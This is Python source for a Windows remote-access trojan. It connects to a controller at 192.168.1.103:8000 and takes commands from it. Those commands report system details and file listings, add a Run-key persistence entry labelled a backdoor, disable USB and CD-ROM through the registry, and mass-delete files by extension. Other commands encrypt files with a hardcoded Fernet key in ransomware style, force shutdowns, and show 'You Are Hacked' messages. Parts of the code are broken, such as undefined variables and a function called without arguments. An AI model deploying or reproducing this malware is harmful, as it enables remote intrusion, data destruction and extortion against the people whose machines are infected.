import socket
import subprocess , os
import _winreg
import datetime
#import win32api
#import pathlib
import tkMessageBox
import ctypes
from _winreg import *
from subprocess import check_output
#from cryptography.fernet import Fernet
import json


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.103",8000))


def Get_Drives():
    drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
    sys_drive=[]
    cmd = check_output("net share",shell=True)
    for i in drive:
        if i in cmd:
            sys_drive.append(i)
    return(sys_drive)

def FindFiles(drive,fileExtention):
        fileNames=[]
        try:
            cmd = check_output(drive+":/ && dir /S /B *."+fileExtention,shell=True)
            fileNames.append(cmd)
        except:
            pass
        return fileNames

def Get_IP():
        hostname = socket.gethostname()    
        IPAddr = socket.gethostbyname(hostname)
        return str(IPAddr)


def Create_DumpFile(drive , cnt):
         for j in range(int(cnt)):
                check_output("echo You Are Hacked > " + str(drive) + ":\\" + str(j)+ ".txt", shell=True)


#This is Function for Disable CDROM
def Disable_CDROM():
    keyVal = r'SYSTEM\CurrentControlSet\Services\cdrom'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE,keyVal)
    SetValueEx(key,"start",0,REG_DWORD,4)
    CloseKey(key)

#This is Function for Enables CDROM
def Enable_CDROM():
    keyVal = r'SYSTEM\CurrentControlSet\Services\cdrom'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE,keyVal)
    SetValueEx(key,"start",0,REG_DWORD,1)
    CloseKey(key)

#This is Function for Disables USB
def Disable_USB():
    keyVal = r'SYSTEM\CurrentControlSet\Services\USBSTOR'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE,keyVal)
    SetValueEx(key,"start",0,REG_DWORD,4)
    CloseKey(key)

#This is Function for Enables USB
def  Enable_USB():
    keyVal = r'SYSTEM\CurrentControlSet\Services\USBSTOR'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE,keyVal)
    SetValueEx(key,"start",0,REG_DWORD,3)
    CloseKey(key)

def Create_BackDoor():
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER,keyVal)
    SetValueEx(key,"notepad",0,REG_SZ,"C:\\Windows\\System32\\Notepad.exe")
    CloseKey(key)

def Encrypt_Files(drive,extention):
        key = "vsgDfJ8ZDKP8vT2dMXnRNyzcKvBasBhgO9pF7HQvAiA="#Fernet.generate_key()
        targetFiles = FindFiles()
        for f in targetFiles:
                file = open(f,"rb")
                data = file.read()
                file.close()
                New_File = open("_"+f,"wb")
                f = Fernet(key)
                Encrypt = f.encrypt(data)
                New_File.write(Encrypt)
                New_File.close()

def Decrypt_Files(drive,extention):
        key = "vsgDfJ8ZDKP8vT2dMXnRNyzcKvBasBhgO9pF7HQvAiA="#Fernet.generate_key()
        targetFiles = FindFiles()
        for f in targetFiles:
                file = open("_"+f,"rb")
                data = file.read()
                file.close()
                New_File = open("1.jpg","wb")
                f = Fernet(key)
                Decrypt = f.decrypt(data)
                New_File.write(Decrypt)
                New_File.close()

while True:
        data=s.recv(12345)
        c=data.decode()
        if c=="0":
                s.send("test Connection : OK".encode())
               
        if c=="11":
                ip=Get_IP()
                s.send(ip)
        if c=="12":
                cmd=subprocess.check_output("systeminfo",shell=True)
                s.send(cmd)
        if c=="13":
                sysDrives=Get_Drives()
                s.send(json.dumps(sysDrives))
                
        if c=="14":
                print("get date")
                timestampStr = datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S.%f)")
                print('Current Timestamp : ', timestampStr)
                s.send(timestampStr)
                
        if c.startswith("21"):
            driveLetter=c.split(".")[1]
            fileExtention=c.split(".")[2]
            fileNames = FindFiles(driveLetter, fileExtention) 
            s.send(json.dumps(fileNames))    

        if c.startswith("22"):
                port=c.split(".")[1]
                ip = Get_IP()
                r=s.connect_ex((ip,int(port)))
                if(r==0):
                        s.send("Port Is Open")
                else:
                        s.send("Port Is Closed")
                        

        if c=="23":
               Create_BackDoor()
               s.send("Back Door Created")

        if c=="24":
               Disable_CDROM()
               s.send("CD-ROM Disabled")               

        if c=="25":
               Enable_CDROM()
               s.send("CD-ROM Enabled")

        if c=="26":
               Disable_USB()
               s.send("USB Disabled")

        if c=="27":
               Enable_USB()
               s.send("USB Enabled")                

        if c.startswith("31"):
                drive = c.split(".")[1]
                extention = c.split(".")[2]
                cmd = check_output(drive+"&& del /S *."+extension,shell=True)
                s.send(extention+" Files Deleted from Drive "+drive)

        if c.startswith("32"):
                drive = c.split(".")[1]
                count = c.split(".")[2]
                Create_DumpFile(drive,count)
                s.send(count+" Files Created In Drive "+drive)


        if c.startswith("33"):
                drive = c.split(".")[1]
                extention = c.split(".")[2]
                Encrypt_Files(drive,count)
                s.send(extention+" Files Encrypted In Drive "+drive)


        if c.startswith("34"):
                drive = c.split(".")[1]
                extention = c.split(".")[2]
                Decrypt_Files(drive,extention)
                s.send(count+" Files Files Decrypted In Drive "+drive)
                       
        if c=="35":
                print("Restarting")
                cmd=subprocess.check_output("shutdown /r ",shell=True)
                s.send("System is Restarting for 10 Second".encode())
        if c=="36":
                cmd=subprocess.check_output("shutdown -L",shell=True)
                s.send("System Log off".encode())
        if c=="37":
                cmd=subprocess.check_output("shutdown /p ",shell=True)
                s.send("System is Shutdown".encode())
        if c=="38":
                
                tkMessageBox.showinfo("Warning", "You Are Hacked")
                #ctypes.windll.user32.MessageBoxW(0, "You Are Hacked", "Warning", 1)
        
 
            
                
    
    
    
    

            

